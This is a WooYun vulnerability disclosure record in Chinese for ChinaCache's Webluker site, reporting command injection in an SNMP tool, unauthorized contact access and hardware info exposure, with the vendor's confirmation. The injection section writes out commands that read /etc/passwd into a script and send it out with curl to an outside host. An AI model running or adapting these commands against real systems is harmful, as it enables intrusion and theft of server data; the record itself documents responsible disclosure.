{"id": 6137, "wybug_id": "wooyun-2013-047050", "wybug_title": "ChinaCache旗下豆豆网命令执行及越权访问(非struts)", "wybug_corp": "ChinaCache", "wybug_author": "专业种田", "wybug_date": "2013-12-26 09:35", "wybug_open_date": "2014-02-09 09:35", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程命令执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-12-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-09：\t细节向公众公开  简要描述： 圣诞节被人抛弃了，只能挖挖漏洞了。北京豆豆网络科技有限责任公司是北京蓝汛（ChinaCache）的子公司，成立于2011年，Webluker是北京豆豆网络旗下品牌 详细说明：  1、命令执行漏洞在snmp探测工具中未对目标地址进行过滤，可直接输入``来执行命令。http://www.webluker.com/webtools/snmp因为没有回显，我使用的方法是通过Curl命令， Url传参把想到的数据传到指定的网站,然后查看日志获取返回结果。\n\n一次只能执行一个命令，使用：分号或者 &&方式执行多个命令，不怎么好使。我直接写入脚本再执行。如：想获取/etc/passwd的内容，分别执行如下代码：\n`echo \"hack='\\`cat /etc/passwd|awk -v RS='' -v OFS='|' '$1=$1'\\`'\" > /tmp/hack.sh``echo 'curl http://www.wooyun.com/a.php?hacking=$hack' >> /tmp/hack.sh``sh /tmp/hack.sh`\n查看网站日志(这个请求的网站你必须有权限看到日志)\n\n2、联系人信息越权访问，这里不多说。http://my.webluker.com/user/editManager/?m_id=4\n\n3、创建设备监控时，限制不严，可获取服务器本机的硬件信息.不过要抓包，再修改IP才可以。\n\n   漏洞证明：  \n\n至于拿Shell，程序大多是Python的，而且网站目录不可写。所以放弃了，应该有其它办法可以的。   修复方案：  过滤！权限控制!   版权声明：转载请注明来源 专业种田@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-12-26 10:04 厂商回复： 再次感谢 @专业种田！经确认问题确实存在，我们正在修复。感谢提醒！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-26 09:42 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  os？    \n     2013-12-26 09:42 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  jk?    \n     2013-12-26 09:44 |    \t\t专业种田  \t\t\t( 核心白帽子 |\t\t\t        Rank:1425 漏洞数:182        | 没有最专业的农民,只有更努力地耕耘..........)\t\t \n  程序问题,直接调用系统命令    \n     2015-04-14 17:20 |    \t\t_Evil \t\t\t( 普通白帽子  |\t\t\t        Rank:418 漏洞数:59        | 万事无他,唯手熟尔。农民也会编程,别指望天...)\t\t \n  6666666    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}